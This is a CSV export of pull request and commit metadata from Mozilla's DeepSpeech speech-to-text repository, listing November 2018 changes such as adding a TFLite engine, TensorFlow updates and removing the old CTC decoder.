,pullid,pulls_number,pulltitle,pullsbody,pullsuserlogin,pullsuserid,pullauthordate,author_association,merged_status,stats_addns,stats_delns,stats_changed_files,pull_repo_desc,pull_repo_lang,pull_commit_sha,pull_commit_message
2648,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1710,1710,Add TFLite engine,,lissyx,1645737,2018-11-06T14:33:01Z,COLLABORATOR,True,1834,74,70,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,69aa316c88ab3f709dd642223d7f51aa68ceb147,Add TFLite engine
2649,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1710,1710,Add TFLite engine,,lissyx,1645737,2018-11-06T14:33:01Z,COLLABORATOR,True,1834,74,70,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,49ccf7f33b603350d0ed88c300dbcea42b8276ce,Enable TFLite on Android
2650,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1710,1710,Add TFLite engine,,lissyx,1645737,2018-11-06T14:33:01Z,COLLABORATOR,True,1834,74,70,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,456da33f9573ca8d4bafe54baf99d7665ed62ac2,"Building native_client on Android

$ ndk-build APP_PLATFORM=android-21 APP_BUILD_SCRIPT=$(pwd)/Android.mk NDK_PROJECT_PATH=$(pwd) APP_STL=c++_shared TFDIR=... TARGET_ARCH_ABI=arm64-v8a"
2651,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1710,1710,Add TFLite engine,,lissyx,1645737,2018-11-06T14:33:01Z,COLLABORATOR,True,1834,74,70,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c10cdf08cae9eca5b12ec229cf89156514bca67d,Add JNI + Android example app
2652,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1710,1710,Add TFLite engine,,lissyx,1645737,2018-11-06T14:33:01Z,COLLABORATOR,True,1834,74,70,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6e245ce5bf7550422190536f121baf0d0c15dd18,Add Android TaskCluster build
2653,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1710,1710,Add TFLite engine,,lissyx,1645737,2018-11-06T14:33:01Z,COLLABORATOR,True,1834,74,70,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,672fad9a9b8ff498aa6d288d47813360dd54e825,Update TensorFlow artifacts
2654,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c78a3e57ae612521a5f2954b65ead21505cd0190,Cleanup SUMMARIZE_GRAPH_BINARY
2655,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c67f66f86434d57fc75ed8fc8e1df80be1226a58,Cleanup CONVERT_GRAPHDEF_MEMMAPPED
2656,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,92ded598fbdc5bdce0bf212986d8512b4bc93196,Call toco during export
2657,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,26f7bc30f03c424cb918e53dd9decc7a8c81991b,Move to TensorFlow r1.12
2658,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc85977b6a43d5194625637373178419b090039b,"Merge pull request #1690 from lissyx/convert-toco

Convert toco"
2659,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c310b7f45dd53b25a3eecc69c3bffdc28d198dd,"Bump VERSION to 0.4.0-alpha.0

X-DeepSpeech: NOBUILD"
2660,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8b0abd5364e154c9c5f057386c9c77a971c39462,"Merge pull request #1692 from lissyx/bump-v0.4.0-alpha.0

Bump VERSION to 0.4.0-alpha.0"
2661,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ce8f41398c0c9dab2134fb3b04ae3c61d62300d,"Updated making mmap-able model part of README.md

In the making mmap-able model part of the REAMDE.md file, there is no mention of providing `convert_graphdef_memmapped_format` as the artifact name for `taskcluster.py` file. Without this argument `taskcluster.py` file tries to download the default `native_client.tar.xz` artifact and the code receives a 404 error."
2662,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4a520e8b5725e59c86fc9a55b1db7ba1f73f29c9,"Merge pull request #1698 from j-a-h-i-r/master

Updated making mmap-able model part of README.md"
2663,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,740e8584bde902c3f8c14eacd1064df6ba169e28,Add benchmark_model tests
2664,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d2438397ce3795f802a864a58e31286db12b3e89,Update TensorFlow r1.12
2665,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1c71263790dd2bea82032a73a8e4947f1ab06f35,"Merge pull request #1697 from lissyx/add-benchmark_model-tasks

Add benchmark model tasks"
2666,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,706b54f26470ef031fa3aa4d1b90f90d3b7ec6ff,Merge remote-tracking branch 'upstream/master' into update-tf-master
2667,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b8f184d6c9f5b407ca81d00b5476ea252dd35903,Ensure TensorFlow master
2668,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1708,1708,Update tf master,,lissyx,1645737,2018-11-06T07:06:48Z,COLLABORATOR,True,127,58,26,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a42344a37baf0173d7515e3e1c3f1f81c009b076,Update TensorFlow master
2669,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1707,1707,error message and script for looking at chars in transcripts,added extra error message that gets thrown when the alphabet and transcripts dont match,JRMeyer,8389864,2018-11-06T02:33:34Z,CONTRIBUTOR,False,132,9,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bc0e2ee40f565f787aede178c7a54f6438fd756c,error message and script for looking at chars in transcripts
2670,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1707,1707,error message and script for looking at chars in transcripts,added extra error message that gets thrown when the alphabet and transcripts dont match,JRMeyer,8389864,2018-11-06T02:33:34Z,CONTRIBUTOR,False,132,9,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,83f20c2135c4ca16b542bf031d48c6174fe389a9,data filter and comput
2671,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1698,1698,Updated making mmap-able model part of README.md,"In the making mmap-able model part of the REAMDE.md file, there is no mention of providing `convert_graphdef_memmapped_format` as the artifact name for `taskcluster.py` file. Without this argument `taskcluster.py` file tries to download the default `native_client.tar.xz` artifact and the code receives a 404 error.",j-a-h-i-r,21159766,2018-11-05T18:57:50Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ce8f41398c0c9dab2134fb3b04ae3c61d62300d,"Updated making mmap-able model part of README.md

In the making mmap-able model part of the REAMDE.md file, there is no mention of providing `convert_graphdef_memmapped_format` as the artifact name for `taskcluster.py` file. Without this argument `taskcluster.py` file tries to download the default `native_client.tar.xz` artifact and the code receives a 404 error."
2672,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1697,1697,Add benchmark model tasks,,lissyx,1645737,2018-11-05T15:04:38Z,COLLABORATOR,True,54,12,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,740e8584bde902c3f8c14eacd1064df6ba169e28,Add benchmark_model tests
2673,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1697,1697,Add benchmark model tasks,,lissyx,1645737,2018-11-05T15:04:38Z,COLLABORATOR,True,54,12,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d2438397ce3795f802a864a58e31286db12b3e89,Update TensorFlow r1.12
2674,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1696,1696,Remove old CTC decoder (Fixes #1675),"- [x] Remove old decoder code and build system integration
- [x] Remove references in code and tests
- [x] Update documentation",reuben,477142,2018-11-03T15:42:01Z,MEMBER,True,1457,14436,134,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3255f2342685af2602ac156b836ce05d944b5455,ctcdecode binding fixes
2675,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1696,1696,Remove old CTC decoder (Fixes #1675),"- [x] Remove old decoder code and build system integration
- [x] Remove references in code and tests
- [x] Update documentation",reuben,477142,2018-11-03T15:42:01Z,MEMBER,True,1457,14436,134,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc2d9f427d0ccb0a0f8919e7d5cb530c1cd7c9d5,"Remove training tests with deepspeech package

The presence of the package no longer influences training."
2676,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1696,1696,Remove old CTC decoder (Fixes #1675),"- [x] Remove old decoder code and build system integration
- [x] Remove references in code and tests
- [x] Update documentation",reuben,477142,2018-11-03T15:42:01Z,MEMBER,True,1457,14436,134,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0333728ebcbe7a9f6fa2a22b3d9587e139a32df,Build decoder package in automation
2677,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1696,1696,Remove old CTC decoder (Fixes #1675),"- [x] Remove old decoder code and build system integration
- [x] Remove references in code and tests
- [x] Update documentation",reuben,477142,2018-11-03T15:42:01Z,MEMBER,True,1457,14436,134,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,53e3e1212bcf75c5bbe389c5d533e2acfe2731fa,Remove old CTC decoder code
2678,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1696,1696,Remove old CTC decoder (Fixes #1675),"- [x] Remove old decoder code and build system integration
- [x] Remove references in code and tests
- [x] Update documentation",reuben,477142,2018-11-03T15:42:01Z,MEMBER,True,1457,14436,134,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,60fb5ad04c8a070c8db4c03313a089921ffb566f,Remove old versions of decoder binary files
2679,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1696,1696,Remove old CTC decoder (Fixes #1675),"- [x] Remove old decoder code and build system integration
- [x] Remove references in code and tests
- [x] Update documentation",reuben,477142,2018-11-03T15:42:01Z,MEMBER,True,1457,14436,134,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,56dc024d295f386b218def789f16187f2e808f85,"Centralize WER report code into evaluate.py, call it from DeepSpeech.py"
